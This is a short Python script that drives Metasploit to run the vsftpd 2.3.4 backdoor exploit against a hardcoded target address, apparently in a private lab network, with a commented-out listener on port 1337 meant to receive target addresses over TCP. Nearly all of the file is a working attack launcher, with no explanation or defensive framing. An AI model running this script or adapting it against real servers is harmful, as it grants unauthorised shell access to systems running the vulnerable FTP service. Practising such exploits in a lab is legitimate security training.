#!/usr/bin/env python3
from nclib import TCPServer
import subprocess

#def listener():

#server = TCPServer(("192.168.56.108", 1337))
#for client in server:
	#target = client.recv()
	#print(target)
target = '192.168.56.112'
def generate(target):
	exploit = "use exploit/unix/ftp/vsftpd_234_backdoor; set rhost "+target+"; run"
	subprocess.run(["msfconsole", "-q", "-x", exploit])

	
#listener()
generate(target)
